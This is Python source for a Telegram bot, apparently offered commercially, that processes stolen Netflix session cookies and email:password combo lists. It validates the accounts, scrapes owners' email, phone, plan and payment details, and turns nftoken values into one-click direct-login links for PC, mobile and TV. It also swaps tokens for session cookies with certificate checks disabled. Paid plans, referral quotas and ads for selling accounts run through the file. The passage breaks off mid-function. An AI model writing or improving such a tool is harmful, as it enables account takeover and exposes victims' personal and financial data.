import logging
import sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import os
import zipfile
import tempfile
import shutil
import json
import re
import scraper
from datetime import datetime
import asyncio
import html

# Fix Windows console encoding for emojis
if sys.platform.startswith('win'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

# Set concurrency limit (Max simultaneous checks to avoid API bans)
CONCURRENCY_LIMIT = 20
api_semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
from config import BOT_TOKEN, OWNER_ID
from db import Database

# Configure logging - LIVE DEBUG MODE
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.DEBUG
)
# Enable debug/info for specific modules
logging.getLogger('telegram').setLevel(logging.INFO)
logging.getLogger('httpx').setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

def _md_safe_inline(text: object) -> str:
    """Make dynamic text safe for Telegram Markdown inline code.
    Currently strips backticks to avoid breaking code spans.
    """
    try:
        return str(text).replace('`', "'")
    except Exception:
        return ''

def _get_link_status_message(link: str) -> str:
    """Get status message for the generated link"""
    if not link or link == "N/A":
        return "❌ *No link generated - cookies may be invalid*"
    elif link == "NO_NFTOKEN_FOUND":
        return "❌ *No working nftoken found - cookies may not contain usable nftoken*"
    elif link == "COOKIES_EXPIRED":
        return "❌ *Cookies expired - please get fresh cookies*"
    elif "nftoken=" in link:
        return "✅ *NFToken link generated - should work for one-click login*"
    else:
        return "🔗 *Custom link generated*"

def _cleanup_artifacts(aggressive: bool = False) -> None:
    """Remove debug/log artifacts from the working directory.

    aggressive=True also deletes generic .log files and any "Invalid.zip" bundles.
    """
    try:
        for fname in os.listdir('.'):
            try:
                if not os.path.isfile(fname):
                    continue
                lower = fname.lower()
                if (
                    lower.startswith('debug_') or
                    lower.startswith('nfshot_') or
                    lower.startswith('nfsecshot_') or
                    (aggressive and lower.endswith('.log')) or
                    (aggressive and lower.endswith(' invalid.zip')) or
                    (aggressive and lower.endswith('.png'))
                ):
                    os.remove(fname)
            except Exception:
                continue
        # Remove common cache dirs
        for dname in ['__pycache__']:
            try:
                if os.path.isdir(dname):
                    shutil.rmtree(dname, ignore_errors=True)
            except Exception:
                pass
    except Exception:
        pass

def parse_netflix_cookies(content):
    """Parse Netflix cookies from various formats safely"""
    cookies = []
    
    # 1. Try JSON Array extraction (handles leading/trailing text)
    try:
        start_idx = content.find('[')
        end_idx = content.rfind(']')
        if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
            json_str = content[start_idx:end_idx+1]
            json_data = json.loads(json_str)
            src = json_data if isinstance(json_data, list) else [json_data]
            for item in src:
                if isinstance(item, dict):
                    name = item.get('name') or item.get('Name')
                    value = item.get('value') or item.get('Value')
                    domain = item.get('domain') or item.get('Domain') or '.netflix.com'
                    path = item.get('path') or item.get('Path') or '/'
                    if name and value:
                        cookies.append({
                            'name': str(name),
                            'value': str(value),
                            'domain': str(domain),
                            'path': str(path),
                            'secure': True,
                            'httpOnly': True
                        })
    except Exception:
        pass

    if cookies: return cookies

    # 2. Try generic name=value extraction
    try:
        # If it's a combo string ending with NetflixCookies=..., isolate that part
        match = re.search(r'NetflixCookies=(.*)', content)
        target_content = match.group(1) if match else content
        
        pairs = re.findall(r'([^=;\s\|]+)\s*=\s*([^;\n\r\|]+)', target_content)
        if pairs:
            names_lower = {n.lower() for n, _ in pairs}
            has_netflix_keys = any(k in names_lower for k in ['netflixid', 'securenetflixid']) or any('netflix' in n for n in names_lower)
            if has_netflix_keys:
                for name, value in pairs:
                    if name and value:
                        cookies.append({
                            'name': name.strip(),
                            'value': value.strip().strip('"'),
                            'domain': '.netflix.com',
                            'path': '/',
                            'secure': True,
                            'httpOnly': True
                        })
    except Exception:
        pass

    if cookies: return cookies

    # 3. Handle lines starting with Cookie: header
    try:
        for line in content.split('\n'):
            if line.lower().startswith('cookie:'):
                header = line.split(':', 1)[1]
                for pair in header.split(';'):
                    if '=' in pair:
                        name, value = pair.split('=', 1)
                        if name.strip() and value.strip():
                            cookies.append({
                                'name': name.strip(),
                                'value': value.strip(),
                                'domain': '.netflix.com',
                                'path': '/',
                                'secure': True,
                                'httpOnly': True
                            })
    except Exception:
        pass

    if cookies: return cookies

    # 4. Fallback: Parse Netscape format
    try:
        lines = content.split('\n')
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#') and 'netflix.com' in line:
                parts = line.split('\t') if '\t' in line else line.split()
                if len(parts) >= 7:
                    domain, _, path, secure, http_only, name, value = parts[:7]
                    cookies.append({
                        'name': name,
                        'value': value,
                        'domain': domain,
                        'path': path,
                        'secure': str(secure).lower() == 'true',
                        'httpOnly': str(http_only).lower() == 'true'
                    })
    except Exception as e:
        logger.error(f"Error parsing netscape cookies: {e}")
        
    return cookies

async def _delete_later(path: str, delay_seconds: int = 60) -> None:
    try:
        await asyncio.sleep(delay_seconds)
        if os.path.exists(path):
            os.remove(path)
    except Exception:
        pass

def _details_look_valid(details: dict | None) -> bool:
    """Heuristic to decide if cookie or account is valid.
    Treat as valid if any strong field is present and status is not DEAD.
    """
    if not isinstance(details, dict):
        return False
    if details.get("error") in ["no_cookies", "login_redirect", "expired"] or details.get("status") == "DEAD":
        return False
    strong_keys = [
        'email', 'plan', 'member_since', 'package', 'profile_name', 'service_code', 'profiles_count', 'language', 'membership_status', 'country'
    ]
    for key in strong_keys:
        val = details.get(key)
        if isinstance(val, str) and val.strip() and val.strip().lower() not in ('n/a', 'unknown', 'none', ''):
            return True
    return False

def _split_cookie_text_into_sets(content: str) -> list[dict]:
    """Split TXT content into multiple account items using the smart extractor."""
    from archive_parser import extract_items_from_text
    items = extract_items_from_text(content)
    if len(items) > 1:
        return [{'name': f'TXT part #{i}', 'content': it} for i, it in enumerate(items, 1)]
    elif len(items) == 1:
        return [{'name': 'TXT Content', 'content': items[0]}]
    return [{'name': 'TXT Content', 'content': content}] if content.strip() else []

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or str(user_id)
    
    referrer_id = None
    if context.args and context.args[0].isdigit():
        referrer_id = int(context.args[0])
        
    await Database.get_or_create_user(user_id, username, referrer_id)
    await Database.update_last_active(user_id)
    
    if user_id == OWNER_ID:
        welcome_text = """🎬 <b>Netflix Cookie Bot - Direct Login Edition</b>

👑 <b>Welcome Boss! You have UNLIMITED access.</b>

✨ <b>Features:</b>
<blockquote expandable>🔄 <b>Auto-Process</b> - Instant cookie validation & details extraction
📁 <b>Multi-Format</b> - ZIP, TXT, JSON, Netscape formats supported  
🌍 <b>Auto-English</b> - Automatically changes account language to English
📊 <b>Complete Info</b> - Email, phone, plan, payment, viewing history
🔗 <b>Direct Login Links</b> - Generate nftoken-based direct login URLs
⚡ <b>Fast Results</b> - Enhanced scraper with detailed account info</blockquote>

<blockquote>📤 <b>Send me:</b>
• ZIP files with Netflix cookies
• TXT files with cookie data  
• Direct cookie text/JSON</blockquote>

🎯 <b>Get instant results with direct login links!</b>

<blockquote>👨‍💻 <b>Dev by iq4u8</b></blockquote>"""
    else:
        welcome_text = """🎬 <b>Netflix Cookie Bot - Direct Login Edition</b>

✨ <b>Features:</b>
<blockquote expandable>🔄 <b>Auto-Process</b> - Instant cookie validation & details extraction
📁 <b>Multi-Format</b> - ZIP, TXT, JSON, Netscape formats supported  
🌍 <b>Auto-English</b> - Automatically changes account language to English
📊 <b>Complete Info</b> - Email, phone, plan, payment, viewing history
🔗 <b>Direct Login Links</b> - Generate nftoken-based direct login URLs
⚡ <b>Fast Results</b> - Enhanced scraper with detailed account info</blockquote>

<blockquote>📤 <b>Send me:</b>
• ZIP files with Netflix cookies
• TXT files with cookie data  
• Direct cookie text/JSON</blockquote>

🎯 <b>Get instant results with direct login links!</b>

⚠️ <b>Limits:</b> You are on a free trial. Refer friends to get more limits!

<blockquote>👨‍💻 <b>Dev by iq4u8</b></blockquote>

🎁 <b>Refer to get more limits!</b>"""

    from telegram import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
    reply_buttons = [
        [KeyboardButton("🎯 Valid Checker", style="success"), KeyboardButton("👤 Account", style="success")],
        [KeyboardButton("📋 Plans", style="success"), KeyboardButton("🎁 Refer", style="success")]
    ]
    
    if user_id == OWNER_ID:
        reply_buttons.append([KeyboardButton("💎 Premium", style="primary"), KeyboardButton("👑 Admin Panel", style="primary")])
    else:
        reply_buttons.append([KeyboardButton("💎 Premium", style="primary")])

    reply_keyboard = ReplyKeyboardMarkup(reply_buttons, resize_keyboard=True, is_persistent=False)

    inline_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh Session", callback_data="refresh_session")]
    ])

    await context.bot.send_message(chat_id=update.effective_chat.id, text=welcome_text, parse_mode='HTML', reply_markup=inline_keyboard)
    await context.bot.send_message(chat_id=update.effective_chat.id, text="👇 <b>Select an option from the menu:</b>", parse_mode='HTML', reply_markup=reply_keyboard)

async def is_premium_user(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    user = await Database.get_user(user_id)
    if user and user.get("unlimited_until"):
        if user["unlimited_until"] > datetime.utcnow():
            return True
    return False

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all incoming messages"""
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or update.effective_user.first_name or "User"
        await Database.get_or_create_user(user_id, username)
        
        if update.message.document:
            await handle_file(update, context)
        elif update.message.text:
            await handle_text(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

BATCH_SIZE = 10
MAX_INVALID_TRIES = 2

def _cleanup_session_state(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Clear in-memory state and delete local debug images."""
    try:
        _cleanup_artifacts(aggressive=True)
        # Clear user_data
        context.user_data.pop('pending_cookies', None)
        context.user_data.pop('results_meta', None)
        context.user_data.pop('force_stop', None)
        context.user_data.pop('pending_batch_cookies', None)
        context.user_data.pop('last_update', None)
        context.user_data.pop('processing_msg_id', None)
        if 'batch_task' in context.user_data:
            context.user_data['batch_task'].cancel()
            context.user_data.pop('batch_task', None)
    except Exception:
        pass

async def _finalize_batch(context: ContextTypes.DEFAULT_TYPE):
    update = context.user_data.get('last_update')
    cookies_data = context.user_data.get('pending_batch_cookies', [])
    if not cookies_data or not update:
        return
        
    user_id = update.effective_user.id
    msg_id = context.user_data.get('processing_msg_id')
    
    remaining = await Database.get_remaining_limit(user_id)
    
    if remaining != -1: # Free user limits apply
        if remaining <= 0:
            text = """⚠️ *Zero Limit Reached!*

You have exhausted your free limits. To continue checking cookies, you must upgrade your plan or refer friends.

🎁 *Referral Bonus*: `+10 Checks per Referral`
🛍️ *Plans*: `Unlimited Access`"""
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📋 View Plans", callback_data="buy_plan:show")],
                [InlineKeyboardButton("🎁 My Referral Link", callback_data="referral")]
            ])
            if msg_id:
                await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg_id, text=text, parse_mode='Markdown', reply_markup=keyboard)
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown', reply_markup=keyboard)
            
            context.user_data['pending_batch_cookies'] = []
            context.user_data.pop('processing_msg_id', None)
            return

        if not await Database.check_limit(user_id):
            if msg_id:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=msg_id,
                    text=f"⚠️ *Daily Limit Reached!*\n\nYou have already found your maximum 10 valid accounts for today. Upgrade your plan for unlimited access!",
                    parse_mode='Markdown'
                )
                await asyncio.sleep(2)
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"⚠️ *Daily Limit Reached!*\n\nYou have already found your maximum 10 valid accounts for today. Upgrade your plan for unlimited access!",
                    parse_mode='Markdown'
                )
            context.user_data['pending_batch_cookies'] = []
            return
        
    context.user_data['pending_cookies'] = cookies_data
    context.user_data['force_stop'] = False
    context.user_data['results_meta'] = [{} for _ in range(len(cookies_data))]
    
    total = len(cookies_data)
    mode = context.user_data.get('check_mode', 'extract')
    
    if mode == 'filter':
        if not msg_id:
            new_msg = await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📁 *Detected items:* {total}\n⏳ Starting in filter mode...",
                parse_mode='Markdown'
            )
            msg_id = new_msg.message_id
        
        # reset batch
        context.user_data['pending_batch_cookies'] = []
        context.user_data.pop('processing_msg_id', None)
        
        from telegram.ext import ContextTypes
        await start_filter_processing(update, context, 0, msg_id)
        return

    # Extract Mode - Auto Start
    if not msg_id:
        new_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"📁 *Detected items:* {total}\n⏳ Starting extraction...",
            parse_mode='Markdown'
        )
        msg_id = new_msg.message_id
        
    # reset batch
    context.user_data['pending_batch_cookies'] = []
    context.user_data.pop('processing_msg_id', None)
    
    await start_batch_processing(update, context, 0, msg_id)

def _trigger_batch(update: Update, context: ContextTypes.DEFAULT_TYPE, new_cookies: list):
    context.user_data.setdefault('pending_batch_cookies', []).extend(new_cookies)
    context.user_data['last_update'] = update
    
    if 'batch_task' in context.user_data:
        context.user_data['batch_task'].cancel()
        
    async def process_batch():
        try:
            await asyncio.sleep(1.5)
            await _finalize_batch(context)
        except asyncio.CancelledError:
            pass
            
    context.user_data['batch_task'] = asyncio.create_task(process_batch())

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads - ZIP/TXT files"""
    try:
        user_id = update.effective_user.id
        is_prem = await is_premium_user(user_id)
        file = update.message.document
        file_name = file.file_name
        
        if not file_name.lower().endswith('.txt') and not is_prem:
            await update.message.reply_text("⚠️ *Premium Feature!*\n\nZIP files and other formats are only supported for premium users. Please upload a `.txt` file or upgrade.", parse_mode='Markdown')
            return
            
        if not context.user_data.get('processing_msg_id'):
            processing_msg = await update.message.reply_text("🔄 *Processing...*", parse_mode='Markdown')
            context.user_data['processing_msg_id'] = processing_msg.message_id
            
        file_obj = await context.bot.get_file(file.file_id)
        temp_dir = tempfile.mkdtemp()
        file_path = os.path.join(temp_dir, file_name)
        await file_obj.download_to_drive(file_path)
        
        context.user_data['pending_file_path'] = file_path
        context.user_data['pending_file_name'] = file_name
        
        # Parse uploaded file recursively (supports nested ZIPs, RAR, TAR, multi-account TXT)
        from archive_parser import parse_uploaded_file_to_cookies
        has_netflix = False
        cookies_data = []
        try:
            cookies_data = parse_uploaded_file_to_cookies(file_path, file_name)
            if cookies_data:
                netflix_keywords = ['netflix.com', 'netflixid', 'securenetflixid', 'cookie', 'nftoken']
                for item in cookies_data:
                    c_str = item.get('content', '').lower()
                    if any(kw in c_str for kw in netflix_keywords) or c_str.strip().startswith('[') or c_str.strip().startswith('{'):
                        has_netflix = True
                        break
        except Exception as e:
            logger.error("Error parsing uploaded file: %s", e)
            
        if has_netflix:
            context.user_data['check_mode'] = 'extract'
            _trigger_batch(update, context, cookies_data)
            return
            
        # Ask user for service type (combos detected)
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="🎬 Netflix", callback_data="file_service:netflix")]
        ])
        
        msg_id = context.user_data.get('processing_msg_id')
        if msg_id:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=msg_id,
                text="📁 *File uploaded!*\n\nCombos detected. What type of accounts are in this file?",
                parse_mode='Markdown',
                reply_markup=keyboard
            )
            # Leave processing_msg_id intact so the callback can edit it, or the callback will use query.message.message_id
            # Actually on_button uses query.message.message_id which is this same message!
        else:
            await update.message.reply_text("📁 *File uploaded!*\n\nCombos detected. What type of accounts are in this file?", parse_mode='Markdown', reply_markup=keyboard)

    except Exception as e:
        await update.message.reply_text(f"❌ File processing error: {str(e)}")

async def send_referral_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ref_info = await Database.get_referral_info(user_id)
    
    bot = await context.bot.get_me()
    ref_link = f"https://t.me/{bot.username}?start={user_id}"
    
    if user_id == OWNER_ID:
        text = f"""👑 *OWNER DASHBOARD* 👑
    
Hello Boss! You have **unlimited** access to everything. 
No limits apply to you!

📊 *Your Stats:*
• Total Referrals: {ref_info.get('count', 0)}
• Current Limit: ♾️ Unlimited

🔗 *Your Referral Link:*
`{ref_link}`"""
    else:
        limits_text = f"{ref_info.get('limit', 0)} cookies"
        unlimited = ref_info.get('unlimited_until')
        
        if unlimited and unlimited > datetime.utcnow():
            limits_text = f"♾️ Unlimited until {unlimited.strftime('%Y-%m-%d %H:%M:%S')} UTC"
        
        text = f"""🎁 *REFERRAL SYSTEM* 🎁
        
Share your link and get free limits!
• *Bonus:* `+10 cookies check limit` per successful referral!
        
📊 *Your Stats:*
• Total Referrals: {ref_info.get('count', 0)}
• Current Limit: {limits_text}

🔗 *Your Referral Link:*
`{ref_link}`"""

    if update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode='Markdown')
    else:
        await update.message.reply_text(text, parse_mode='Markdown')

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct text input (cookies)"""
    try:
        user_id = update.effective_user.id
        is_prem = await is_premium_user(user_id)
        text = update.message.text
        
        if context.user_data.get('awaiting_user_id_for_plan') and user_id == OWNER_ID:
            target_id = text.strip()
            if not target_id.isdigit():
                await update.message.reply_text("❌ Invalid User ID. Must be a number.")
                return
            context.user_data['awaiting_user_id_for_plan'] = False
            context.user_data['target_plan_user_id'] = int(target_id)
            
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 Trial (1 Day)", callback_data="admin:grant_plan:1")],
                [InlineKeyboardButton("🛒 Basic (7 Days)", callback_data="admin:grant_plan:7")],
                [InlineKeyboardButton("🛒 Super (30 Days)", callback_data="admin:grant_plan:30")],
                [InlineKeyboardButton("🛒 Pro (180 Days)", callback_data="admin:grant_plan:180")],
                [InlineKeyboardButton("❌ Cancel", callback_data="close_menu")]
            ])
            await update.message.reply_text(f"Select plan to grant to User `{target_id}`:", parse_mode='Markdown', reply_markup=kb)
            return

        if text == "👑 Admin Panel":
            if user_id == OWNER_ID:
                await admin_command(update, context)
            return

        if text == "🎯 Valid Checker":
            is_prem = await is_premium_user(user_id)
            if not is_prem:
                await update.message.reply_text("⚠️ *Premium Feature*\n\nThe Valid Checker is only available for Premium users. Please upgrade your plan to use this feature.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 View Plans", callback_data="buy_plan:show")]]))
                return
            context.user_data['check_mode'] = 'filter'
            await update.message.reply_text("✅ *Mode set to Filter Valid/Invalid (Fast)*\nNow send your cookies/files.", parse_mode='Markdown')
            return
        elif text == "👤 Account":
            first_name = update.effective_user.first_name or "User"
            username = update.effective_user.username or first_name
            user_data = await Database.get_user(user_id)
            if not user_data:
                user_data = await Database.get_or_create_user(user_id, username)
            is_prem = await is_premium_user(user_id)
            
            db_plan = user_data.get('plan_name', 'Free') if user_data else 'Free'
            plan = f"💎 {db_plan}" if is_prem else f"🆓 {db_plan}"
            
            if is_prem:
                validity = "♾️ Lifetime" if user_id == OWNER_ID else (user_data.get('unlimited_until', 'N/A').strftime('%Y-%m-%d') if user_data and user_data.get('unlimited_until') else "Unknown")
                limits = "♾️ Unlimited"
                reset_timer = "N/A"
            else:
                validity = "N/A"
                rem = await Database.get_remaining_limit(user_id)
                limits = f"{rem} / 10"
                reset_timer = await Database.get_time_until_reset(user_id)
            
            acc_text = f"""👤 *Account Information*

👤 *Name:* {html.escape(first_name)}
🆔 *ID:* `{user_id}`
💳 *Plan:* {plan}
📅 *Validity:* {validity}
🎯 *Daily Valid Limits:* {limits}
⏱️ *Limits Reset In:* {reset_timer}"""
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ Close", callback_data="close_account")]
            ])
            await update.message.reply_text(acc_text, parse_mode='Markdown', reply_markup=keyboard)
            return
        elif text in ["💎 Premium", "📋 Plans"]:
            plans_text = """
💎 *PREMIUM PLANS* 💎
Get unrestricted access with our premium plans! 

*1. Trial Plan (1 Day)*
🔸 Price: ₹40 / 0.38 USDT
🔸 Access: Unlimited for 24 hours

*2. Basic Plan (Weekly)*
🔸 Price: ₹200 / 1.90 USDT
🔸 Access: Unlimited for 7 days

*3. Super Plan (Monthly)*
🔸 Price: ₹499 / 4.75 USDT
🔸 Access: Unlimited for 30 days

*4. Pro Plan (6 Months)*
🔸 Price: ₹2000 / 19.05 USDT
🔸 Access: Unlimited for 6 months

_Select a plan below to buy!_
"""
            plans_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🛒 Buy Trial (₹40)", callback_data="buy_plan:trial"),
                 InlineKeyboardButton(text="🛒 Buy Basic (₹200)", callback_data="buy_plan:basic")],
                [InlineKeyboardButton(text="🛒 Buy Super (₹499)", callback_data="buy_plan:super"),
                 InlineKeyboardButton(text="🛒 Buy Pro (₹2000)", callback_data="buy_plan:pro")],
                [InlineKeyboardButton(text="🔙 Back", callback_data="close_menu")]
            ])
            await update.message.reply_text(plans_text, parse_mode='Markdown', reply_markup=plans_keyboard)
            return
        elif text == "🎁 Refer":
            await send_referral_info(update, context)
            return
            
        # Check if the user sent one or more nftoken URLs
        import aiohttp
        import ssl
        tokens = re.findall(r'nftoken=([^&\s]+)', text)
        if tokens:
            if not context.user_data.get('processing_msg_id'):
                processing_msg = await update.message.reply_text("🔄 *Exchanging tokens for cookies...*", parse_mode='Markdown')
                context.user_data['processing_msg_id'] = processing_msg.message_id
            
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            
            new_cookie_texts = []
            
            async with aiohttp.ClientSession() as session:
                for token in tokens:
                    try:
                        session.cookie_jar.clear()
                        # Setting User-Agent to avoid generic blocks
                        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
                        async with session.get(f"https://www.netflix.com/account?nftoken={token}", headers=headers, ssl=ssl_ctx, allow_redirects=False) as resp:
                            netflix_id = ""
                            for cookie in session.cookie_jar:
                                if cookie.key == "NetflixId":
                                    netflix_id = cookie.value
                            if not netflix_id and resp.status in (301, 302, 303, 307, 308):
                                async with session.get(f"https://www.netflix.com/account?nftoken={token}", headers=headers, ssl=ssl_ctx) as resp2:
                                    for cookie in session.cookie_jar:
                                        if cookie.key == "NetflixId":
                                            netflix_id = cookie.value
                            if netflix_id:
                                fake_cookie = json.dumps([{"name": "NetflixId", "value": netflix_id, "domain": ".netflix.com", "path": "/"}])
                                new_cookie_texts.append(fake_cookie)
                    except Exception:
                        pass
                        
            if new_cookie_texts:
                # Replace text with JSON strings separated by newlines
                text = "\n\n".join(new_cookie_texts)
            else:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['processing_msg_id'],
                    text="❌ *TOKEN EXPIRED*\n\nThe provided token links are invalid or expired.",
                    parse_mode='Markdown'
                )
                return
                
        # Auto Detect logic
        netflix_keywords = ['netflix.com', 'netflixid', 'securenetflixid', 'cookie', 'nftoken']
        has_netflix = any(keyword in text.lower() for keyword in netflix_keywords) or text.startswith('[') or text.startswith('{')
        is_combo = bool(re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s\|]+)', text.strip()))
        
        if has_netflix:
            context.user_data['check_mode'] = 'extract'
            if not context.user_data.get('processing_msg_id'):
                processing_msg = await update.message.reply_text("🔄 *Processing Netflix...*", parse_mode='Markdown')
                context.user_data['processing_msg_id'] = processing_msg.message_id
            
            cookies_data = []
            parts = _split_cookie_text_into_sets(text)
            if len(parts) > 1:
                for idx, item in enumerate(parts, start=1):
                    cookies_data.append({
                        'name': f"Direct Input [#{idx}]",
                        'content': item['content']
                    })
            else:
                cookies_data = [{
                    'name': 'Direct Input',
                    'content': text
                }]
                
            _trigger_batch(update, context, cookies_data)
            
        elif is_combo:
            context.user_data['pending_file_path'] = None
            context.user_data['pending_text_content'] = text
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🎬 Netflix", callback_data="text_service:netflix")]
            ])
            
            await update.message.reply_text("✨ Combo detected!\n\n*Which service is this for?*", parse_mode='Markdown', reply_markup=keyboard)
            
        else:
            await update.message.reply_text(
                "❓ *Could not auto-detect format.*\n"
                "• For Netflix: Send cookies containing 'netflix.com' or JSON brackets\n"
                "• Or upload a .txt/.zip file!",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ Text processing error: {str(e)}")

def _format_account_response(account_details: dict) -> str:
    def format_val(val, skip_na=False):
        v_str = str(val) if val is not None else "N/A"
        if skip_na and v_str in ("N/A", "Unable to fetch"):
            return html.escape(v_str)
        return f"<code>{html.escape(v_str)}</code>"
        
    profiles_raw = str(account_details.get('profiles', 'N/A'))
    if profiles_raw == "N/A":
        profiles_fmt = "N/A"
    else:
        profiles_fmt = ", ".join(f"<code>{html.escape(p.strip())}</code>" for p in profiles_raw.split(","))

    return f"""🎬 <b>NETFLIX ACCOUNT</b> 🎬

<blockquote expandable>🟡 <b>Status:</b> <code>Active</code> ✅
🌍 <b>Region:</b> {format_val(account_details.get('country', account_details.get('region', 'United States')))}
⏰ <b>Member Since:</b> {format_val(account_details.get('member_since', 'N/A'))}
👑 <b>Plan:</b> {format_val(account_details.get('plan', 'N/A'))}
💳 <b>Payment:</b> {format_val(account_details.get('package', 'N/A'))}
📅 <b>Next Billing:</b> {format_val(account_details.get('next_billing', 'N/A'))}
🎭 <b>Profiles:</b> {profiles_fmt}
📧 <b>Email:</b> {format_val(account_details.get('email', 'N/A'))}
   └─ {html.escape(str(account_details.get('email_verified', '❌ Non-verified')))}
📱 <b>Phone:</b> {format_val(account_details.get('phone_number', 'N/A'), skip_na=True)}
   └─ {html.escape(str(account_details.get('phone_verified', '❌ Non-verified')))}
👥 <b>Extra Members:</b> {html.escape(str(account_details.get('extra_members', 'No ❌')))}
🌐 <b>Display Language:</b> {format_val(account_details.get('language', 'English'))}
📺 <b>Latest Watch Date:</b> {format_val(account_details.get('last_viewed', 'Unable to fetch'), skip_na=True)}</blockquote>

✅ <b>NFToken link generated - should work for one-click login</b>

🎬 <b>Grab Netflix Cookies or Private Accounts</b>
➡️ <b>DM Now</b> 👉 @iq4u8
📢 <b>Join OUR CHANNEL</b> 👉 @iq4us"""

# Semaphore for api requests
api_semaphore = asyncio.Semaphore(10)

async def _background_scrape(message, cookies, initial_details, context, idx, cookie_data):
    """Background task to fetch full account details and update the message."""
    try:
        enhanced_details = await scraper.fetch_enhanced_account_details(cookies)
        if enhanced_details and _details_look_valid(enhanced_details):
            # Keep original link
            link = initial_details.get("direct_login_link")
            enhanced_details["direct_login_link"] = link
            
            # Format and edit message
            new_text = _format_account_response(enhanced_details)
            
            per_item_buttons = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton(text="💻 PC", url=link.replace('/account?', '/browse?'), style="primary"),
                    InlineKeyboardButton(text="☎️ MOBILE", url=link.replace('/account?', '/unsupported?'), style="success"),
                    InlineKeyboardButton(text="📺 TV", url=link.replace('/account?', '/tv9?'), style="danger")
                ],
                [
                    InlineKeyboardButton(text="🔙 Back", callback_data="stop")
                ]
            ])
            
            await message.edit_text(new_text, parse_mode='HTML', reply_markup=per_item_buttons)
            
            # Update meta
            if 'results_meta' in context.user_data and len(context.user_data['results_meta']) > idx:
                context.user_data['results_meta'][idx].update({
                    'service_code': enhanced_details.get('service_code'),
                    'screenshot_path': enhanced_details.get('screenshot_path'),
                    'email': enhanced_details.get('email')
                })
    except Exception as e:
        logger.error(f"Background scrape failed: {e}")


async def process_cookies_unlimited(update, context, cookies_data, processing_msg_id):
    """Process all cookies with unlimited access asynchronously"""
    try:
        results = []
        total_cookies = len(cookies_data)
        successful = 0
        failed = 0
        
        async def _send_result_to_user(text: str, reply_markup=None):
            sent_message = None
            user_id = getattr(update.effective_user, 'id', None)
            if user_id is not None:
                try:
                    sent_message = await context.bot.send_message(
                        chat_id=user_id,
                        text=text,
                        parse_mode='Markdown',
                        reply_markup=reply_markup
                    )
                except Exception as dm_err:
                    logger.warning(f"DM failed, falling back to chat: {dm_err}")
            if not sent_message:
                sent_message = await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
            if "COOKIES EXPIRED" in text or "NO NFToken FOUND" in text:
                async def delete_msg(msg):
                    await asyncio.sleep(2)
                    try:
                        await msg.delete()
                    except Exception:
                        pass
                asyncio.create_task(delete_msg(sent_message))
            return sent_message

        async def _process_single_cookie_concurrently(cookie_data, index):
            nonlocal successful, failed
            
            user_id = getattr(update.effective_user, 'id', 0)
            if user_id != OWNER_ID:
                has_limit = await Database.check_limit(user_id)
                if not has_limit:
                    await _send_result_to_user("⚠️ *Limit Exceeded!*\n\nYou have 0 limits left. Please refer a friend or buy premium to check more cookies.")
                    return
                    
            cookies = parse_netflix_cookies(cookie_data['content'])
            content_str = cookie_data['content'].strip()
            combo_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s\|]+)', content_str)
            
            async with api_semaphore:
                try:
                    direct_link = "NO_NFTOKEN_FOUND"
                    if cookies:
                        logger.info("🔍 API: Generating direct login link from cookies...")
                        direct_link = await scraper.generate_direct_login_link_api(cookies)
                    
                    if direct_link in ["COOKIES_EXPIRED", "NO_NFTOKEN_FOUND", "ERROR", "BROWSER_ERROR", "N/A"]:
